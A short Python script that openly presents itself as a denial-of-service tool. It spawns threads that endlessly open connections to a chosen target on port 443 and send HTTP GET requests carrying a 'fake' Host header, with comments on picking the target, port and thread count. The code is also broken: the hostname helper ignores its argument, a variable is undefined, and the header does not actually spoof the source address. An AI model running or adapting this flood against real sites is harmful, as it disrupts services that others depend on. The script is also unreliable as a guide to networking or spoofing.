
import socket
import threading

def find_ip(hostname:str) ->str:
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    return ip

# if you have an hostname use target_ip = find_ip("badguys.ru")
target_ip = ''
# you can change to anything you want
fake_ip = '217.107.219.57'
# port can be 443 or 80 check if the website has https
port = 443
# check before how many cores you have and use about 25% of max thread available
max_threads = 5

#this is a counter 
attack_num = 0
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, port))

        global attack_num
        attack_num += 1
        print(attack_num)

        s.close()
        
def initiate():
    for i in range(max_threads):
        thread = threading.Thread(target=attack)
        thread.start()
        
if __name__ == "__main__":
    initiate()
